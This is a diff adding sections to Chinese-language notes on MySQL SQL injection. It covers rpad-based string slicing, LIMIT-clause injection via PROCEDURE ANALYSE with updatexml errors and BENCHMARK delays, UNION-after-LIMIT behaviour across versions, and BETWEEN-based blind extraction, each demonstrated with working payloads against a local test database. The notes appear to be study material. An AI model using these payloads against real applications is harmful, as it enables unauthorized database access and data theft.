@@ -638,6 +638,64 @@ select * from table1 where id='1' or if(length(database())<1,rpad('a',300000,'a'
 Time: 0.009s
 ```
 
+在某些情况下,`rpad`可作为`mid`和`substr`的替换
+
+>`0x0`指代的是`\x00`
+
+```
+mysql root@localhost:sql_injection_test> select * from table1;
++----+----------+----------+-----------------+
+| id | username | password | email           |
++----+----------+----------+-----------------+
+| 1  | admin    | admin!@# | admin@admin.org |
+| 2  | tim      | 123456   | tim@qq.com      |
+| 3  | mike     | asdfqwer | mike@gmail.com  |
+| 4  | mike     | asdfqwer | mike@gmail.com  |
++----+----------+----------+-----------------+
+4 rows in set
+Time: 0.008s
+mysql root@localhost:sql_injection_test> select rpad((select group_concat(id) from table1),1,0x0)
++---------------------------------------------------+
+| rpad((select group_concat(id) from table1),1,0x0) |
++---------------------------------------------------+
+| 1                                                 |
++---------------------------------------------------+
+1 row in set
+Time: 0.008s
+mysql root@localhost:sql_injection_test> select rpad((select group_concat(id) from table1),2,0x0)
++---------------------------------------------------+
+| rpad((select group_concat(id) from table1),2,0x0) |
++---------------------------------------------------+
+| 1,                                                |
++---------------------------------------------------+
+1 row in set
+Time: 0.007s
+mysql root@localhost:sql_injection_test> select rpad((select group_concat(id) from table1),8,0x0)
++---------------------------------------------------+
+| rpad((select group_concat(id) from table1),8,0x0) |
++---------------------------------------------------+
+| 1,2,3,4                                          |
++---------------------------------------------------+
+1 row in set
+Time: 0.007s
+mysql root@localhost:sql_injection_test> select rpad((select group_concat(username) from table1),1,0x0)
++---------------------------------------------------------+
+| rpad((select group_concat(username) from table1),1,0x0) |
++---------------------------------------------------------+
+| a                                                       |
++---------------------------------------------------------+
+1 row in set
+Time: 0.008s
+mysql root@localhost:sql_injection_test> select rpad((select group_concat(username) from table1),10,0x0)
++----------------------------------------------------------+
+| rpad((select group_concat(username) from table1),10,0x0) |
++----------------------------------------------------------+
+| admin,tim,                                               |
++----------------------------------------------------------+
+1 row in set
+Time: 0.008s
+```
+
 ### 堆叠注入
 
 即多语句执行,例题可以参照sqli-labs的Less-38
@@ -989,9 +1047,267 @@ Time: 0.008s
 
 ### limit注入
 
->todo
+1. 有`order by`
+
+mysql中`union`不能在`order by`后面,且一个语句中不能出现多次`order by`
+
+[Mysql下Limit注入方法](https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html)
+
+[SQL注入：limit注入](https://lyiang.wordpress.com/2015/10/25/sql%E6%B3%A8%E5%85%A5%EF%BC%9Alimit%E6%B3%A8%E5%85%A5/)
+
+以`limit`结尾的sql语句,后面可以接`procedure`或者`into outfile`
+
+`into outfile`主要用来写shell,此处注重应是通过`procedure`读取数据
+
+`procedure`后面接`analyse`,其中要填充两个参数,此处可以利用报错注入或者延时注入
+
+```
+mysql root@localhost:mysql> select * from user order by host limit 0,1 procedure analyse(updatexml(1,concat(0x7e,version(),0x7e),1),1);
+(1105, "XPATH syntax error: '~5.5.44~'")
+mysql root@localhost:mysql> select * from user order by host limit 0,1 procedure analyse(updatexml(1,concat(0x7e,(select group_concat(schema_name) from information_schema.schemata),0x7e),1),1);
+(1105, "XPATH syntax error: '~information_schema,mysql,perfor'")
+```
+
+延时注入,这里不能用`sleep`
+
+`select * from user order by host limit 0,1 PROCEDURE analyse(updatexml(1,IF((select mid(user(),1,1)='r'),BENCHMARK(100000000,1+1),1),1),1)`
+
+2. 无`order by`
+
+直接用`union`即可,存在版本限制(未验证版本范围)
+
+```
+mysql root@localhost:mysql> select @@version;
++-----------+
+| @@version |
++-----------+
+| 5.5.47    |
++-----------+
+1 row in set
+Time: 0.008s
+mysql root@localhost:mysql> select host from user limit 0,1 union select user from user;
++------+
+| host |
++------+
+| %    |
+| root |
++------+
+2 rows in set
+Time: 0.009s
+```
+
+```
+mysql root@localhost:mysql> select @@version;
++-----------+
+| @@version |
++-----------+
+| 5.7.36    |
++-----------+
+1 row in set
+Time: 0.007s
+mysql root@localhost:mysql> select host from user limit 0,1 union select user from user;
+(1221, 'Incorrect usage of UNION and LIMIT')
+mysql root@localhost:mysql> (select host from user limit 0,1) union (select user from user);
++---------------+
+| host          |
++---------------+
+| %             |
+| root          |
+| mysql.session |
+| mysql.sys     |
++---------------+
+4 rows in set
+Time: 0.008s
+```
 
 ### between and注入
+
+`between and`可以`=,<,>,like,regexp`被过滤的情况下使用
+
+>取值范围说明
+
+```
+mysql root@localhost:sql_injection_test> select 'b' between 'a' and 'c'
++-------------------------+
+| 'b' between 'a' and 'c' |
++-------------------------+
+| 1                       |
++-------------------------+
+1 row in set
+Time: 0.008s
+mysql root@localhost:sql_injection_test> select 'b' between 'b' and 'c'
++-------------------------+
+| 'b' between 'b' and 'c' |
++-------------------------+
+| 1                       |
++-------------------------+
+1 row in set
+Time: 0.007s
+mysql root@localhost:sql_injection_test> select 'b' between 'a' and 'b'
++-------------------------+
+| 'b' between 'a' and 'b' |
++-------------------------+
+| 1                       |
++-------------------------+
+1 row in set
+Time: 0.007s
+```
+
+```
+mysql root@localhost:sql_injection_test> select 'bb' between 'a' and 'c'
++--------------------------+
+| 'bb' between 'a' and 'c' |
++--------------------------+
+| 1                        |
++--------------------------+
+1 row in set
+Time: 0.008s
+mysql root@localhost:sql_injection_test> select 'bb' between 'a' and 'b'
++--------------------------+
+| 'bb' between 'a' and 'b' |
++--------------------------+
+| 0                        |
++--------------------------+
+1 row in set
+Time: 0.007s
+mysql root@localhost:sql_injection_test> select 'bb' between 'b' and 'c'
++--------------------------+
+| 'bb' between 'b' and 'c' |
++--------------------------+
+| 1                        |
++--------------------------+
+1 row in set
+Time: 0.008s
+```
+
+单字符时取值范围为`[min,max]`,多字符时取值范围为`[min,max)`
+
+>实际场景
+
+```
+mysql root@localhost:sql_injection_test> select user()
++-----------------+
+| user()          |
++-----------------+
+| root@172.18.0.1 |
++-----------------+
+1 row in set
+Time: 0.008s
+mysql root@localhost:sql_injection_test> select user() between 'q' and 'z'
++----------------------------+
+| user() between 'q' and 'z' |
++----------------------------+
+| 1                          |
++----------------------------+
+1 row in set
+Time: 0.008s
+mysql root@localhost:sql_injection_test> select user() between 'r' and 'z'
++----------------------------+
+| user() between 'r' and 'z' |
++----------------------------+
+| 1                          |
++----------------------------+
+1 row in set
+Time: 0.008s
+mysql root@localhost:sql_injection_test> select user() between 's' and 'z'
++----------------------------+
+| user() between 's' and 'z' |
++----------------------------+
+| 0                          |
++----------------------------+
+1 row in set
+Time: 0.013s
+```
+
+可以得知`user()`第一个字母为`r`
+
+---
+
+```
+mysql root@localhost:sql_injection_test> select group_concat(username) from table1
++------------------------+
+| group_concat(username) |
++------------------------+
+| admin,tim,mike,mike    |
++------------------------+
+1 row in set
+Time: 0.008s
+mysql root@localhost:sql_injection_test> select (select substr(group_concat(username),1,1) from table1);
++---------------------------------------------------------+
+| (select substr(group_concat(username),1,1) from table1) |
++---------------------------------------------------------+
+| a                                                       |
++---------------------------------------------------------+
+1 row in set
+Time: 0.007s
+mysql root@localhost:sql_injection_test> select (select substr(group_concat(username),1,1) from table1) between 'a' and 'a';
++-----------------------------------------------------------------------------+
+| (select substr(group_concat(username),1,1) from table1) between 'a' and 'a' |
++-----------------------------------------------------------------------------+
+| 1                                                                           |
++-----------------------------------------------------------------------------+
+1 row in set
+Time: 0.008s
+mysql root@localhost:sql_injection_test> select (select substr(group_concat(username),1,1) from table1) between 'b' and 'b';
++-----------------------------------------------------------------------------+
+| (select substr(group_concat(username),1,1) from table1) between 'b' and 'b' |
++-----------------------------------------------------------------------------+
+| 0                                                                           |
++-----------------------------------------------------------------------------+
+1 row in set
+Time: 0.007s
+```
+
+可以用16进制代替字符串
+
+```
+mysql root@localhost:sql_injection_test> select user() between 0x61 and 0x7a # between 'a' and 'z'
++------------------------------+
+| user() between 0x61 and 0x7a |
++------------------------------+
+| 1                            |
++------------------------------+
+1 row in set
+Time: 0.010s
+mysql root@localhost:sql_injection_test> select user() between 0x726f and 0x727a # between 'ro' and 'rz'
++----------------------------------+
+| user() between 0x726f and 0x727a |
++----------------------------------+
+| 1                                |
++----------------------------------+
+1 row in set
+Time: 0.008s
+mysql root@localhost:sql_injection_test> select user() between 0x7270 and 0x727a # between 'rp' and 'rz'
++----------------------------------+
+| user() between 0x7270 and 0x727a |
++----------------------------------+
+| 0                                |
++----------------------------------+
+1 row in set
+Time: 0.010s
+```
+
+>例子
+
+```
+mysql root@localhost:sql_injection_test> select * from table1 where id='-1' or if((select(select group_concat(username) from table1) between 'a' and 'z'),1,0)
++----+----------+----------+-----------------+
+| id | username | password | email           |
++----+----------+----------+-----------------+
+| 1  | admin    | admin!@# | admin@admin.org |
+| 2  | tim      | 123456   | tim@qq.com      |
+| 3  | mike     | asdfqwer | mike@gmail.com  |
+| 4  | mike     | asdfqwer | mike@gmail.com  |
++----+----------+----------+-----------------+
+4 rows in set
+Time: 0.008s
+mysql root@localhost:sql_injection_test> select * from table1 where id='-1' or if((select(select group_concat(username) from table1) between 'z' and 'z'),1,0)
++----+----------+----------+-------+
+| id | username | password | email |
++----+----------+----------+-------+
+0 rows in set
+Time: 0.008s
+```
 
 ### dnslog外带数据
 
@@ -1283,5 +1599,7 @@ Time: 0.008s
 ```
 
 ### insert update delete注入
+
+
 
 ## 未完待续...
